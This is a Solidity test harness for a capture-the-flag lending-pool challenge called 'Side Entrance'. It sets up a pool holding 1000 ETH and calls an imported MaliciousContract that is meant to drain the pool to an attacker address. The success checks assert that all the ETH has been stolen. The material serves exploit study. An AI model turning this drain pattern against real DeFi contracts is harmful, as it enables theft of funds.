// SPDX-License-Identifier: UNLICENSED
// A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.
// This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using
// the deposited ETH to promote their system.
// You must take all ETH from the lending pool.
pragma solidity 0.8.10;

import {BaseTest} from "../BaseTest.sol";
import {SideEntranceLenderPool} from "../../side-entrance/SideEntranceLenderPool.sol";
import {MaliciousContract} from "../../side-entrance/MaliciousContract.sol";

contract SideEntrance is BaseTest {

    uint ETHER_IN_POOL = 1000 ether;

    SideEntranceLenderPool pool;
    MaliciousContract mc;
    // attacker adddress
    address payable attacker;

    constructor() {
        // setup the needed user accordly
        string[] memory labels = new string[](2);
        labels[0] = "Attacker";
        preSetup(1, 0, labels);
    }

    function setUp() public override {
        super.setUp();
        attacker = users[0];
        pool = new SideEntranceLenderPool();
        mc = new MaliciousContract(address(pool), address(attacker));

        // Set the pool with ETHER_IN_POOL value
        vm.deal(address(pool), ETHER_IN_POOL);
        // Pool balance is 1000 ether
        assertEq(address(pool).balance, ETHER_IN_POOL);
        // Attacker balance
        assertEq(address(attacker).balance, 0);
    }


    function test_Exploit() public {
        runTest();
    }

    function exploit() internal override {
        /** CODE YOUR EXPLOIT HERE */
        mc.attack();
        mc.sendValueToAttacker();
    }

    function success() internal override {
        /** SUCCESS CONDITIONS */
        // Now the pool lost their balance
        assertEq(address(pool).balance, 0);
        // Now the attacker has all the pool balance
        assertEq(address(attacker).balance, ETHER_IN_POOL);
    }
}